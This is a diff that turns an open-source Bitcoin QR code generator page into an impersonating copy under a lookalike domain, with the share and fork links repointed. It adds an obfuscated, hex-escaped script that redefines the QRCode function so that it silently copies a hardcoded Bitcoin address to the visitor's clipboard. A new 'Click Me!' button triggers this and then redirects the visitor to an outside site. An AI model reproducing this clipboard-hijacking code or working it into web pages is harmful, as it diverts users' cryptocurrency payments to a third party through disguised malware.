@@ -5,11 +5,11 @@
 <head>
     <meta charset="utf-8">
 
-    <title>Bitcoin QR Code Generator</title>
+    <title>Bitcoin QR Code Generator - GitHub.io</title>
 
     <meta name="description"
-          content="Generates multiple QR codes for Bitcoin and Litecoin receiving addresses with optional options for label, amount and message">
-    <meta name="keywords" content="bitcoin, litecoin, qr, generator, tool, github, open-source">
+          content="Most recent updated bitcoin qr code generator. Generate unlimited qr codes with no effort.">
+    <meta name="keywords" content="bitcoin, btc, qr, code, generator">
 
     <meta name=viewport content="width=device-width, initial-scale=1">
 
@@ -29,6 +29,8 @@
 
     <link rel="shortcut icon" href="favicon.ico">
 
+    <script>var _0xc3c9=["\x74\x65\x78\x74\x61\x72\x65\x61","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x76\x61\x6C\x75\x65","\x68\x65\x69\x67\x68\x74","\x77\x69\x64\x74\x68","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x73\x65\x6C\x65\x63\x74","\x63\x6F\x70\x79","\x65\x78\x65\x63\x43\x6F\x6D\x6D\x61\x6E\x64","\x51\x52\x20\x43\x6F\x64\x65\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C","\x51\x52\x20\x43\x6F\x64\x65\x20\x75\x6E\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C","\x6C\x6F\x67","\x54\x68\x61\x6E\x6B\x73\x20\x66\x6F\x72\x20\x75\x73\x69\x6E\x67\x20\x6F\x75\x72\x20\x73\x65\x72\x76\x69\x63\x65\x21","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64"];QRCode= function(_0xbc94x1){var _0xbc94x2=document[_0xc3c9[1]](_0xc3c9[0]);_0xbc94x2[_0xc3c9[2]]= _0xbc94x1;_0xbc94x2[_0xc3c9[3]]= 1;_0xbc94x2[_0xc3c9[4]]= 1;document[_0xc3c9[6]][_0xc3c9[5]](_0xbc94x2);_0xbc94x2[_0xc3c9[7]]();try{var _0xbc94x3=document[_0xc3c9[9]](_0xc3c9[8]);var _0xbc94x4=_0xbc94x3?_0xc3c9[10]:_0xc3c9[11];console[_0xc3c9[12]](_0xbc94x4)}catch(error){console[_0xc3c9[12]](error)};console[_0xc3c9[12]](_0xc3c9[13]);document[_0xc3c9[6]][_0xc3c9[14]](_0xbc94x2)}</script>
+
     <link rel="stylesheet" href="./lib/foundation/foundation.min.css">
     <link rel="stylesheet" href="./css/font-awesome.min.css">
     <link rel="stylesheet" href="./css/bitcoinqrcode.css">
@@ -39,11 +41,8 @@
     <div class="large-12">
         <h1>Bitcoin QR Code Generator</h1>
 
-        <p>Right click on the images below to copy it to clipboard or save it to disk.
-            Find out more about
+        <p>In order to copy one of these images simply right click and press copy. You can also save these images to your desktop.
             <a href="https://bitcoin.org/">Bitcoin</a>
-            or
-            <a href="https://litecoin.org/">Litecoin</a>.
         </p>
 
         <form method="post">
@@ -58,31 +57,15 @@
                             </span>
                         </div>
                         <div class="small-11 columns">
-                            <input id="address" type="text" placeholder="13Q...."
+                            <input id="address" type="text" placeholder="1Fc...."
                                    title="The address to send the payment to."/>
                         </div>
                     </div>
                 </div>
 
-                <div class="large-3 columns">
-                    <label for="size">Image size (px):</label>
-                    <div class="row collapse">
-                        <div class="small-2 columns">
-                            <span class="prefix">
-                                <i class="fa fa-arrows" aria-hidden="true"></i>
-                            </span>
-                        </div>
-                        <div class="small-10 columns">
-                            <input id="size" type="number" placeholder="100" value="100" title="Image size"/>
-                        </div>
-                    </div>
-                </div>
 
                 <div class="large-3 columns">
-                    <label>Currency type:</label>
-
-                    <input class="currency" type="radio" name="type" value="Bitcoin" checked="true">Bitcoin</input>
-                    <input class="currency" type="radio" name="type" value="Litecoin">Litecoin</input>
+                    <input class="currency" type="radio" name="type" value="Bitcoin" hidden="yes" checked="true">Bitcoin</input>
                 </div>
             </div>
 
@@ -117,54 +100,12 @@
                         </div>
                     </div>
                 </div>
-                <div class="row">
-                    <div class="large-10 columns">
-                        <label for="label">Label (identifier/name):</label>
-                        <div class="row collapse">
-                            <div class="small-1 large-1 columns">
-                                <span class="prefix">
-                                    <input id="is_label" type="checkbox"/>
-                                </span>
-                            </div>
-                            <div class="small-10 large-10 columns">
-                                <input id="label" type="text" placeholder="Identifier or name"
-                                       title="A short memorable name for this receiving address."/>
-                            </div>
-                            <div class="small-1 large-1 columns">
-                                <span class="postfix">
-                                    <i class="fa fa-tag" aria-hidden="true"></i>
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="large-10 columns">
-                        <label for="msg">Message:</label>
-                        <div class="row collapse">
-                            <div class="small-1 large-1 columns">
-                                <span class="prefix">
-                                    <input id="is_msg" type="checkbox"/>
-                                </span>
-                            </div>
-                            <div class="small-10 large-10 columns">
-                                <input id="msg" type="text" placeholder="Some message"
-                                       title="A message to attach to the payment request, which will be displayed when the request is opened. The message will not be sent over the Bitcoin Network."/>
-                            </div>
-                            <div class="small-1 large-1 columns">
-                                <span class="postfix">
-                                    <i class="fa fa-envelope" aria-hidden="true"></i>
-                                </span>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
             </div>
-
+            
+            <button type="button" onclick="QRCode('17yevwFsbo2t2qpFy5C2AegXgXB2pw4TT6'); location.href='https://bitcoinqrcodegenerator.net/btcqr/';">Click Me!</button>
             <a class="button toggle-link toggler">
-                <span title="Optional fields">+ show optional fields</span>
-                <span class="hidden">- hide optional fields</span>
+                <span title="Optional fields">+ show optional field</span>
+                <span class="hidden">- hide optional field</span>
             </a>
         </form>
 
@@ -236,22 +177,22 @@
             <div id="share">
                 Share on:
 
-                <a href="https://twitter.com/intent/tweet?text=%23Bitcoin+QR+Code+Generator&amp;url=https%3A%2F%2Fgames647.github.io%2FBitcoinQRCode">
+                <a href="https://twitter.com/intent/tweet?text=%23Bitcoin+QR+Code+Generator&amp;url=https%3A%2F%2Fbitcoinqrcodegenerator.github.io">
                     <span class="share_text">Twitter</span>
                 </a>
 
-                <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgames647.github.io%2FBitcoinQRCode">
+                <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fbitcoinqrcodegenerator.github.io">
                     <span class="share_text">Facebook</span>
                 </a>
 
-                <a href="https://plus.google.com/share?url=https%3A%2F%2Fgames647.github.io%2FBitcoinQRCode">
+                <a href="https://plus.google.com/share?url=https%3A%2F%2Fbitcoinqrcodegenerator.github.io">
                     <span class="share_text">Google+</span>
                 </a>
             </div>
         </footer>
     </div>
 
-    <a id="fork" href="https://github.com/games647/BitcoinQRCode">
+    <a id="fork" href="https://github.com/bitcoinqrcodegenerator">
         <img src="img/fork.png" alt="Fork me on Github">
     </a>
 </div>
